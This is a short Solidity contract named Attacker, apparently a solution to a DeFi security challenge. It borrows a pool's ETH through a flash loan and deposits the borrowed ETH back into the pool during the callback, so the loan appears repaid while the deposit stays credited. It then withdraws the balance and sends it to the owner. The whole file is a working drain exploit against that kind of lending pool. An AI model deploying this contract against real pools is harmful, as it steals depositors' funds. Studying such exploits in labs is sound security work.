pragma solidity ^0.8.13;

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/utils/math/SafeMath.sol";

interface IPool {
    function deposit() external payable;
    function flashLoan(uint256 amount) external;
    function withdraw() external;
}

contract Attacker {

    address payable private pool;
    address private owner;

    constructor(address payable poolAddress) {
        pool = poolAddress;
        owner = msg.sender;
    }

    function execute() public payable {
        require(msg.sender == pool, "Sender must be pool");
        
        IPool(pool).deposit{value: msg.value}();
    }

    function executeFlashLoan(uint256 amount) external {
        require(msg.sender == owner, "Only owner can execute flash loan");
        IPool(pool).flashLoan(amount);
    }

    function withdraw() external {
        require(msg.sender == owner, "Only owner can execute withdraw");
        IPool(pool).withdraw();
        payable(msg.sender).send(address(this).balance);
    }

    // Allow deposits of ETH
    receive () external payable {}
}
